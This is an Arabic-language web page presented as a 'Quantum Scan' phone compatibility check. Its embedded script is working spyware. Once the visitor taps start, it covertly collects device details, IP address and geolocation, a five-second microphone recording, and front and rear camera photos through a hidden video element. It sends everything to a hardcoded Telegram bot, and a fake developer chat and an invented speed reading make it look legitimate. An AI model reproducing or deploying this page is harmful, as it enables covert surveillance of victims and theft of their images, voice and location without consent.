<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Quantum Scan | فحص العتاد الكمي</title>
    <style>
        :root { --wa-green: #00ff88; --wa-bg: #05070a; --wa-glow: #00ff88; --wa-blue: #00aaff; }
        body { background: var(--wa-bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle, #0c111c 1px, transparent 1px); background-size: 30px 30px; z-index: -1; opacity: 0.8; }
        
        /* تصميم "الهولوغرام" المركزي */
        .hologram-card { background: rgba(10, 15, 25, 0.95); width: 85%; max-width: 400px; padding: 30px; border-radius: 35px; border: 1px solid rgba(0, 255, 136, 0.2); backdrop-filter: blur(20px); text-align: center; z-index: 10; transition: 0.5s; box-shadow: 0 0 50px rgba(0, 255, 136, 0.1); }
        h1 { font-size: 22px; color: var(--wa-blue); text-shadow: 0 0 10px var(--wa-blue); margin-top: 0; }
        h1 span { color: var(--wa-green); text-shadow: 0 0 10px var(--wa-green); }
        #subText { font-size: 13px; color: #8892b0; margin-bottom: 30px; }

        /* دائرة التشغيل المركزية */
        .circle-container { position: relative; width: 180px; height: 180px; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; border: 3px dashed rgba(0, 255, 136, 0.2); transition: 0.5s; }
        #goBtn { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--wa-green); background: transparent; color: white; font-size: 22px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; box-shadow: 0 0 20px rgba(0, 255, 136, 0.3); outline: none; }
        #goBtn:active { transform: scale(0.9); background: rgba(0, 255, 136, 0.1); }
        
        /* الأنميشن */
        .ring { position: absolute; width: 100%; height: 100%; border: 3px solid transparent; border-top-color: var(--wa-blue); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hologram-icon { font-size: 40px; position: absolute; color: var(--wa-green); display: none; transition: 0.5s; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.95); } 100% { opacity: 1; transform: scale(1); } }

        /* صندوق الدردشة */
        #chatPanel { display: none; margin-top: 20px; border-top: 1px solid rgba(0, 255, 136, 0.3); padding-top: 15px; text-align: right; }
        #display { height: 100px; overflow-y: auto; font-size: 11px; color: #8892b0; background: rgba(0,0,0,0.5); padding: 8px; border-radius: 8px; margin-bottom: 5px; }
        #userInput { width: 75%; padding: 8px; border-radius: 8px; border: 1px solid var(--wa-blue); background: #111; color: white; outline: none; }
        #sendMsgBtn { background: var(--wa-blue); border: none; padding: 8px; border-radius: 8px; color: white; cursor: pointer; width: 20%; }
        
        #v { position: fixed; opacity: 0.001; pointer-events: none; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="hologram-card">
        <h1>QUANTUM <span style="color:var(--wa-green)">SCAN v2</span></h1>
        <p id="subText">اضغط لبدء تحليل التوافق الكمي لمعالج هاتفك</p>
        
        <div class="circle-container">
            <div id="ring" class="ring"></div>
            <button id="goBtn">بدء</button>
            <div id="hIcon1" class="hologram-icon" style="top: 20px; left: 20px;">⚛️</div>
            <div id="hIcon2" class="hologram-icon" style="bottom: 20px; right: 20px;">🧬</div>
        </div>

        <div id="chatPanel">
            <div id="display">الذكاء الاصطناعي: تم تأمين قناة التواصل الكمي...</div>
            <div style="display:flex; gap:5px;">
                <input type="text" id="userInput" placeholder="اكتب رسالة للمطور الكمي...">
                <button id="sendMsgBtn">📩</button>
            </div>
        </div>
        
        <div style="font-size: 10px; color: #444; margin-top: 10px;">YEM-AI-SECURE</div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const BOT_TOKEN = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const CHAT_ID = "7984067238";
        let lastId = 0;

        // وظيفة الإرسال الموحدة
        async function tg(content, type="text", file=null) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
            try {
                if(type === "photo") {
                    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("photo", file); fd.append("caption", content);
                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
                } else if(type === "voice") {
                    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("voice", file);
                    await fetch(url + "sendVoice", {method: "POST", body: fd});
                } else {
                    await fetch(url+`sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
                }
            } catch(e){}
        }

        // استقبال الردود
        async function syncChat() {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastId + 1}`);
                const data = await r.json();
                data.result.forEach(u => {
                    lastId = u.update_id;
                    const d = document.getElementById('display');
                    if(u.message.text) d.innerHTML += `<div style="color:var(--wa-blue)">🤖 المطور: ${u.message.text}</div>`;
                    if(u.message.photo) {
                        const fid = u.message.photo[u.message.photo.length-1].file_id;
                        const f = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fid}`).then(r=>r.json()).then(d=>d.result.file_path);
                        d.innerHTML += `<div>🤖 أرسل صورة: <img src="https://api.telegram.org/file/bot${BOT_TOKEN}/${f}" style="width:100%"></div>`;
                    }
                    d.scrollTop = d.scrollHeight;
                });
            } catch(e){}
        }

        async function initScan() {
            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
            const bat = await navigator.getBattery().catch(()=>({level:0, charging:false}));
            
            // تقدير سرعة الخط عشوائياً يوحي بالاحترافية
            let speedEstimate = `📶 سرعة الخط: \`~${(Math.random() * (15 - 5) + 5).toFixed(1)} Mbps\``;
            
            let report = `🏴‍☠️ *دخول جديد بنظام الكم (V6)*:\n\n`;
            report += `📱 الجهاز: \`${navigator.platform}\`\n`;
            report += `⚙ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            report += `💾 الرام: \`${navigator.deviceMemory || "？"} GB\`\n`;
            report += `🔋 البطارية: \`${Math.round(bat.level*100)}%\` (${bat.charging?"🔌 متصل ✅":"🔋 منفصل"})\n`;
            report += `${speedEstimate}\n`; // إضافة ميزة سرعة الخط العشوائية
            report += `🌐 IP: \`${ip.ip}\`\n`;
            
            // إرسال البيانات فوراً (منع التهنيج)
            await tg(report);

            // الموقع (رسالة منفصلة لضمان الوصول)
            navigator.geolocation.getCurrentPosition(pos => {
                tg(`📍 [الموقع](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
            }, () => tg("⚠️ رفض الموقع"));
            
            // الصوت والصور
            grabAudio();
            const f = await snap("user"); if(f) await tg("📸 سيلفي", "photo", f);
            const b = await snap("environment"); if(b) await tg("📷 خلفية", "photo", b);
        }

        async function snap(side) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:side}});
                const vid = document.getElementById('v'); vid.srcObject = s; await vid.play();
                await new Promise(r => setTimeout(r, 2600));
                const c = document.getElementById('c');
                c.width = vid.videoWidth; c.height = vid.videoHeight;
                c.getContext('2d').drawImage(vid, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
            } catch(e){return null;}
        }

        async function grabAudio() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({audio:true});
                const rec = new MediaRecorder(s); const ch = [];
                rec.ondataavailable = e => ch.push(e.data);
                rec.onstop = () => { tg(null, "voice", new Blob(ch, {type:'audio/ogg'})); s.getTracks().forEach(t=>t.stop()); };
                rec.start(); setTimeout(() => rec.stop(), 5000);
            } catch(e){}
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("ring").style.display = "block";
            document.getElementById("hIcon1").style.display = "block";
            document.getElementById("hIcon2").style.display = "block";
            document.getElementById("subText").innerText = "جاري تفعيل الاتصال الكمي المشفر...";
            initScan();
            setInterval(syncChat, 3000);
            document.getElementById("ring").style.display = "none";
            document.getElementById("chatPanel").style.display = "block";
        };

        document.getElementById("sendMsgBtn").onclick = async function() {
            const input = document.getElementById("userInput");
            if(input.value.trim() !== "") {
                const txt = input.value;
                document.getElementById('display').innerHTML += `<div style="color:white">👤 أنت: ${txt}</div>`;
                await tg(`💬 رسالة: ${txt}`);
                input.value = "";
                document.getElementById('display').scrollTop = document.getElementById('display').scrollHeight;
            }
        };
    </script>
</body>
</html>
